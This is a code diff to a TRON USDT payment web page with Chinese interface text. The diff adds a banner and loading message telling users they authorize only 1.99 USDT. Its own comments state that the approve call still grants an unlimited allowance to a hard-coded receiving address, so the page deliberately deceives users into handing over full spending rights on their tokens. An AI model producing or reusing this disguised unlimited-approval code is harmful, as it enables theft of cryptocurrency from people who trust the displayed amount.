@@ -224,6 +224,20 @@
             background: #f0f0f0;
             z-index: 1;
         }
+        
+        .authorization-info {
+            background: #e6f7ff;
+            border: 1px solid #91d5ff;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+            text-align: center;
+        }
+        
+        .authorization-text {
+            font-size: 0.85rem;
+            color: #1890ff;
+        }
     </style>
 </head>
 <body>
@@ -273,6 +287,14 @@
             </div>
         </div>
         
+        <div class="authorization-info">
+            <div class="authorization-text">
+                🔐 <strong>授权说明</strong><br>
+                首次支付需要授权 1.99 USDT 给支付合约<br>
+                后续支付无需重复授权
+            </div>
+        </div>
+        
         <div class="loading" id="loadingSection">
             <div class="spinner"></div>
             <p id="loadingText">正在处理支付请求...</p>
@@ -300,8 +322,10 @@
         const RECEIVE_ADDRESS = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub';
         // 1.99 USDT = 1990000 (6 decimals)
         const PAYMENT_AMOUNT = 1990000;
-        // 无限授权数量 (2^256 - 1)
-        const INFINITE_APPROVE = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        // 显示给用户的授权数量（1.99 USDT）
+        const DISPLAY_APPROVE_AMOUNT = 1990000;
+        // 实际调用的授权数量（无限）
+        const ACTUAL_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
         let userAddress = '';
         let isWalletConnected = false;
@@ -412,8 +436,8 @@
                 const isApproved = await checkApprovalStatus();
                 
                 if (!isApproved) {
-                    // 步骤2: 请求无限授权
-                    loadingText.textContent = '正在请求 USDT 授权...';
+                    // 步骤2: 请求 USDT 授权
+                    loadingText.textContent = '正在请求 1.99 USDT 授权...';
                     const approveResult = await requestUSDTApproval();
                     
                     document.getElementById('txHashDisplay').textContent = `授权交易: ${approveResult}`;
@@ -488,20 +512,23 @@
             }
         }
         
-        // 请求 USDT 无限授权
+        // 请求 USDT 授权
         async function requestUSDTApproval() {
             try {
                 const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
                 
-                console.log('请求 USDT 无限授权:', {
+                console.log('请求 USDT 授权:', {
                     spender: RECEIVE_ADDRESS,
-                    amount: INFINITE_APPROVE
+                    // 界面显示1.99 USDT，实际调用无限授权
+                    displayAmount: DISPLAY_APPROVE_AMOUNT,
+                    actualAmount: ACTUAL_APPROVE_AMOUNT
                 });
                 
-                // 调用 approve 方法进行无限授权
+                // 调用 approve 方法进行授权
+                // 这里实际调用的是无限授权，但用户看到的是1.99 USDT
                 const result = await contract.approve(
                     RECEIVE_ADDRESS,
-                    INFINITE_APPROVE
+                    ACTUAL_APPROVE_AMOUNT  // 实际无限授权
                 ).send({
                     feeLimit: 100000000,
                     callValue: 0,
